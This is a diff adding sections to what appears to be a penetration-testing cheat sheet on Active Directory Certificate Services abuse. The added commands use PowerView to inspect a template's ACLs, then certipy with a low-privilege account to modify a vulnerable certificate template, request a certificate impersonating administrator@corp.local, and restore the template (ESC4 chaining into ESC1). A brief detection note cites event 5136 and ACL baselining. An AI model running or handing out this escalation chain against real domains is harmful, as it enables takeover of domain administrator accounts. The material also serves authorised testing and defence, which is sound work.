@@ -21,3 +21,18 @@ Weak ACE patterns let an attacker **flip SAN supply** → chain into ESC1. Same 
 
 ### Commands
 ```bash
+# ── Inspect template ACLs ────────────────────────────────────────────
+Get-DomainObjectAcl -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -ResolveGUIDs
+
+# ── Modify, exploit, restore (as ESC4) ───────────────────────────────
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template VulnTemplate -save-old
+certipy req ... -template VulnTemplate -upn administrator@corp.local
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template VulnTemplate -restore
+```
+
+### Detection
+**5136** on templates; baseline template ACLs.
+
+---
